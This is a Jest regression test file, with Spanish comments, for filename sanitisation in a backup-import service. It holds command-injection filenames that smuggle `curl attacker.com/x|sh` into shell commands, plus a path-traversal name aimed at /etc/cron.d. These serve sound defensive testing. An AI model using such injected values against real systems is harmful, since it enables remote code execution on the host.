/**
 * BackupService.importBackupFromFile (backup-import.ts)
 *
 * `filename` termina interpolado SIN escapar dentro de comandos de shell
 * (`pg_restore --list "${filepath}"` en backup-metadata.ts, y `gunzip`/`file`/
 * `head`/`pg_restore` en backup-restore.ts al restaurar) y como ruta en
 * disco. El nombre original del archivo subido en el import es 100%
 * controlado por quien lo sube (Super Admin, pero sigue siendo una escalada
 * grave: de "puede administrar backups" a "ejecuta comandos de shell en el
 * host"). Sin sanear: `evil.$(curl attacker.com/x|sh).dump` produce un
 * `filepath` que, interpolado en el comando de arriba, ejecuta el `curl|sh`
 * en el momento mismo de importar (antes de cualquier "restaurar"). También
 * permite path traversal (`../../../etc/cualquier-cosa.dump`).
 */

jest.mock('fs/promises', () => ({
  writeFile: jest.fn().mockResolvedValue(undefined),
  stat: jest.fn().mockResolvedValue({ size: 100 }),
  mkdir: jest.fn().mockResolvedValue(undefined),
}))

jest.mock('@/lib/prisma', () => ({
  __esModule: true,
  default: {
    backups: { create: jest.fn().mockImplementation(({ data }: any) => Promise.resolve(data)) },
    audit_logs: { create: jest.fn().mockResolvedValue({}) },
  },
}))

jest.mock('@/lib/services/backup/backup-metadata', () => ({
  extractMetadataFromDump: jest.fn().mockResolvedValue({
    version: '1.0',
    createdAt: new Date().toISOString(),
    tableCounts: {},
    totalRecords: 0,
    fileSize: 100,
  }),
}))

const BACKUP_DIR = '/var/backups'
jest.mock('@/lib/services/backup/backup-utils', () => ({
  BACKUP_DIR: '/var/backups',
  hasPgTools: jest.fn().mockResolvedValue(false), // evita invocar pg_restore real en el test
}))

import { writeFile } from 'fs/promises'
import prisma from '@/lib/prisma'
import { importBackupFromFile } from '@/lib/services/backup/backup-import'

describe('importBackupFromFile — saneamiento de nombre de archivo', () => {
  beforeEach(() => {
    jest.clearAllMocks()
  })

  it('regresión: caracteres de shell (`$()`, comillas, espacios, `;`) se eliminan del nombre final', async () => {
    const malicious = 'backup-evil.$(curl${IFS}attacker.com/x|sh).dump'

    await importBackupFromFile(Buffer.from('PGDMP'), malicious)

    const [filepath] = (writeFile as jest.Mock).mock.calls[0]
    expect(filepath.startsWith(BACKUP_DIR)).toBe(true)
    expect(filepath).not.toMatch(/[$()`;|"'\s]/)
  })

  it('regresión: path traversal en el nombre original no escapa de BACKUP_DIR', async () => {
    const traversal = 'backup-../../../../etc/cron.d/evil.dump'

    await importBackupFromFile(Buffer.from('PGDMP'), traversal)

    const [filepath] = (writeFile as jest.Mock).mock.calls[0]
    expect(filepath.startsWith(BACKUP_DIR + '/')).toBe(true)
    expect(filepath).not.toContain('..')
  })

  it('un nombre normal se conserva funcionalmente (extensión y detección de módulo intactas)', async () => {
    await importBackupFromFile(Buffer.from('PGDMP'), 'backup-tickets-2026-01-01.dump')

    const backupCall = (prisma.backups.create as jest.Mock).mock.calls[0][0].data
    expect(backupCall.filename).toBe('backup-tickets-2026-01-01.dump')
    expect(backupCall.module).toBe('tickets')
  })
})
